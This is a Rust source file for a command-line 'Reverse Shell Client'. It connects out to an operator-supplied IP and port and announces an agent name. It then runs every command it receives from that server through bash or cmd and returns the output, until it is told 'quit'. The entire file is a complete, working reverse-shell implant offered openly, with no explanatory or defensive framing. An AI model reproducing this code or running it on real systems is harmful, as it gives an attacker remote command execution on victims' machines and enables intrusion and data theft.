use std::net::*;
use std::io::*;
use std::process::{Command, Output};
use std::borrow::Cow;
use clap::{Arg, Command as ClapCommand};

fn executecommand(cmd: &String) -> String{

     // Declare variables for shell and argument.
     let (the_shell, the_arg);

     // Check the operating system and assign values.
     if std::env::consts::OS == "windows" {
     
         the_shell = "cmd";
         the_arg = "/c";
     
     } else {
     
         the_shell = "bash";
         the_arg = "-c";
     
     }
 
     // Run the command.
     let res: Output = Command::new(the_shell)
         .arg(the_arg)
         .arg(cmd)
         .output()
         .unwrap();
 
     // Get the output and error and convert to string.
     let stdout: Cow<str> = String::from_utf8_lossy(&res.stdout);
     let stderr: Cow<str> = String::from_utf8_lossy(&res.stderr);
 
     // Check which output to return.
     if stderr.is_empty() {
     
         stdout.to_string()
     
     } else {

         stderr.to_string()
     
     }

}

fn main() {

     // CLI arguments.
     let matches = ClapCommand::new("Reverse Shell Client")
        .version("0.1")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Client")
        
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("Remote server to connect to.")
                .required(true)
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Remote server port.")
                .required(true)
        )
        .arg(
            Arg::new("agent")
                .long("agent")
                .value_name("AGENT")
                .help("Agent Name")
                .required(true)
        )
        .get_matches();

        // Get IP address.
        let serverip = matches.get_one::<String>("IP").expect("IP address argument is required.");

        // Get port.
        let serverport: u16 = matches.get_one::<String>("port").expect("Port argument is required.").parse().expect("Port must be a valid number between 0 and 65535");

        // Converting IP address to Ipv4Addr.
        let _ip = match serverip.parse::<Ipv4Addr>() {
   
            Ok(ip) => ip,
            Err(e) => panic!("{}", e),
   
        };

        // Connect to the server.
        let mut tcpstream = match TcpStream::connect(format!("{}:{}",serverip,serverport)){
   
            Ok(s) => s,
            Err(e) => panic!("{}",e),
   
        };

        // Agent name.
        let agent = matches.get_one::<String>("agent").expect("Agent argument is required.").trim();

        // Message to send to server during initial connection.
        let msg = "".to_string() + agent + ", CONNECTED.\0";

        // Writing message to server.
        let _ = tcpstream.write(msg.as_bytes());

        loop{

            // Variables to receive data from server.
            let mut bufreader = BufReader::new(&tcpstream);
            let mut receivingbuffer:Vec<u8> = Vec::new();
            let _ =bufreader.read_until(b'\0',&mut receivingbuffer);

            // if the server sends "quit" then exit.
            if String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0').trim() == "quit"{

                let _ = tcpstream.write("Exiting\0".as_bytes());
                break;

            }

            // Command from the server.
            let cmd = String::from_utf8_lossy(&receivingbuffer).to_string().trim_end_matches('\0').to_string();
            let mut output = executecommand(&cmd);

            // Add a null character to the end of the string.
            output.push('\0');

            // Send the output to the server.
            let _ = tcpstream.write(output.as_bytes());

        }

        let _ = tcpstream.shutdown(Shutdown::Both);

}